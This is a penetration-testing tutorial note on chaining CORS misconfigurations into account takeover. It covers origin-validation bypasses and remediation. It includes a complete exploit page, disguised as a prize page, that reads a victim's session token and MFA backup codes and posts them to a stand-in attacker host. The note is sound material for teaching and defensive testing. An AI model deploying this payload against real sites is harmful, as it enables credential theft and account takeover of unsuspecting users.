# 60.17 - Chain CORS to Full ATO

## 1. Introduction to Cross-Origin Resource Sharing (CORS) Exploitation

Cross-Origin Resource Sharing (CORS) is a security mechanism enforced by modern web browsers that allows servers to specify which origins (domains, schemes, or ports) are permitted to read data from their APIs. By default, the browser's Same-Origin Policy (SOP) prevents a malicious website from reading the HTTP responses generated by an authenticated session on a target site. 

However, when developers misconfigure CORS—often out of convenience or misunderstanding of wildcards—they unintentionally punch holes in the SOP. When a permissive CORS policy is chained with an endpoint that returns highly sensitive data (such as session tokens, OAuth authorization codes, or user credentials) or an endpoint that performs state-changing actions (like modifying an email address), the result is a complete Account Takeover (ATO).

## 2. The Vulnerability Mechanism: Misconfigured CORS

The danger arises when the server dynamically reflects the `Origin` header supplied by the client and combines it with `Access-Control-Allow-Credentials: true`. 

### The Fatal Combination
If an attacker hosts a malicious page at `https://evil.com` and a victim visits it, the victim's browser sends an HTTP request to the target API with the header `Origin: https://evil.com`. 

If the target API responds with:
```http
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
The browser permits the JavaScript on `https://evil.com` to read the response. Because `Allow-Credentials` is true, the browser automatically includes the victim's ambient cookies (like session IDs) in the request, authenticating it.

## 4. Advanced Bypasses for Origin Validation

Developers often implement regex or substring checks to restrict allowed origins, rather than strict equality checks. VAPT engineers must test for the following bypasses:

### 4.1 Prefix / Suffix Bypasses
If the backend checks if the origin *starts with* or *ends with* the target domain:
- Allowed: `https://target.com`
- Bypass: `https://target.com.evil.com` (attacker registers a subdomain on their domain)
- Bypass: `https://evil.com/target.com` (if parsing is flawed)

### 4.2 The "Null" Origin
Local files, `data:` URIs, and iframe sandboxes send the origin as `null`. Developers sometimes explicitly whitelist `null` thinking it's harmless or useful for local testing.
- Exploit via iframe: `<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,..."></iframe>`
- The target server responds with `Access-Control-Allow-Origin: null`.

### 4.3 Regex Flaws
If the backend validates origin using `^https://.*target\.com$`, it can be bypassed using characters that manipulate the regex engine, or simply by using `https://eviltarget.com` if the period wasn't escaped properly.

## 5. Exploitation Scenario: Stealing Tokens for ATO

Let's walk through a real-world scenario where the `/api/v1/users/me` endpoint returns sensitive authentication material.

### Step 1: Crafting the Malicious Payload
The attacker crafts a JavaScript payload to be hosted on `https://evil.com/exploit.html`.

```html
<!DOCTYPE html>
<html>
<head>
    <title>You Won a Prize!</title>
</head>
<body>
    <h1>Loading your prize...</h1>
    <script>
        // Initiate authenticated CORS request
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "https://api.target.com/api/v1/users/me", true);
        xhr.withCredentials = true; // Crucial for sending cookies

        xhr.onload = function() {
            if (xhr.status === 200) {
                // Read the sensitive response
                var response = JSON.parse(xhr.responseText);
                var secretToken = response.session_token;
                var backupCode = response.mfa_backup_codes[0];
                
                // Exfiltrate to attacker server
                var exfil = new XMLHttpRequest();
                exfil.open("POST", "https://attacker-c2.com/log", true);
                exfil.setRequestHeader("Content-Type", "application/json");
                exfil.send(JSON.stringify({
                    token: secretToken, 
                    mfa: backupCode
                }));
            }
        };
        xhr.send();
    </script>
</body>
</html>
```

### Step 2: Delivery and Execution
The attacker uses phishing, XSS on a secondary site, or social engineering to lure an authenticated victim to `exploit.html`. 

### Step 3: API Takeover and Privilege Escalation
Once the token and MFA backup codes are exfiltrated to the C2 server, the attacker injects the token into their own browser or API client. They immediately navigate to the target application's settings and update the account's email address and password, fully locking out the legitimate user.

## 6. Remediation and Secure Architecture

To definitively resolve CORS vulnerabilities, organizations must implement strict architectural controls:

1. **Strict Origin Whitelisting:** Never reflect the user-supplied `Origin` header dynamically. Maintain a hardcoded whitelist of explicitly trusted domains (e.g., `https://app.target.com`, `https://admin.target.com`).
2. **Avoid Wildcards with Credentials:** The HTTP specification forbids `Access-Control-Allow-Origin: *` in combination with `Access-Control-Allow-Credentials: true`. However, reflecting the origin achieves the same dangerous result and must be avoided.
3. **Do Not Trust `null`:** Never add the `null` origin to a whitelist.
4. **Network-Level Segregation:** Internal APIs should not be exposed to the public internet where CORS manipulation can force a victim's browser to pivot into the internal network.

## 7. Chaining Opportunities

- **[[06 - Cross-Site Scripting (XSS) in Detail]]**: Chain XSS on a low-privilege subdomain to execute CORS attacks against a highly secure API domain that trusts the subdomain.
- **[[19 - Chain Path Traversal to Shell]]**: Use CORS to read sensitive configuration files exposed via a path traversal on an internal, unauthenticated microservice.
- **[[28 - CSRF and State-Changing Attacks]]**: When CORS blocks reading responses but allows writing, pivot the attack to a Cross-Site Request Forgery (CSRF) attack to force state changes.
